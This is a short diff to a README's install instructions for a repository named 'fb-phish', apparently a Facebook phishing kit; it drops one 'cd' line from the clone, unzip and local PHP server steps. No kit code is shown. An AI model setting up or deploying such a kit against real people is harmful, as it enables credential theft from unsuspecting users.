@@ -21,8 +21,7 @@ To install this project
 ```bash
   git clone https://github.com/paradoxmain/fb-phish.git
   cd fb-phish
-  unzip FB-Phish.zip 
-  cd FB-Phish
+  unzip FB-Phish.zip
   php -S localhost:8080
 ```
 
